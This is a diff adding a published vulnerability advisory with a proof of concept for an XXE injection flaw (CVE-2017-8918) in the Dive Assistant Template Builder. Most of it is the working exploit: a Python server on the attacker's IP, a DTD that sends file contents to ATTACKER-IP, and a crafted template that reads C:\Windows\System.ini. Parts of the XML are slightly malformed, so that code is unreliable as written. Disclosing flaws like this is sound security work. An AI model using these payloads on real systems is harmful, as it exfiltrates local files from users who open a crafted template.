@@ -1,0 +1,33 @@
+[+] Exploit Title: Dive Assistant - Template Builder XXE Injection
+[+] Date: 12-05-2017
+[+] Exploit Author: Trent Gordon
+[+] Vendor Homepage: http://www.blackwave.com/
+[+] Software Link: http://www.diveassistant.com/Products/DiveAssistantDesktop/index.aspx
+[+] Version: 8.0
+[+] Tested on: Windows 7 SP1, Windows 10
+[+] CVE: CVE-2017-8918
+
+1. Vulnerability Description
+
+Dive Assistant - Desktop Edition comes with a template builder .exe to create print templates.  The templates are saved and uploaded as XML files which are vulnerable to XXE injection.  Sending a crafted payload to a user, when opened in Dive Assistant - Template Builder, will return the content of any local files to a remote attacker.
+
+2. Proof of Concept
+
+a.) python -m SimpleHTTPServer 9999 (listening on attacker's IP and hosting payload.dtd)
+
+b.) Hosted "payload.dtd"
+
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER-IP:9999?%file;'>">
+
+%all;
+
+c.) Exploited "template.xml"
+
+<?xml version="1.0"?
+<!DOCTYPE exploit [
+<!ENTITY % file SYSTEM "C:\Windows\System.ini">
+<!ENTITY % dtd SYSTEM "http://ATTACKER-IP:9999?%file;'>">
+%dtd;]>
+<exploit>&send;</exploit>
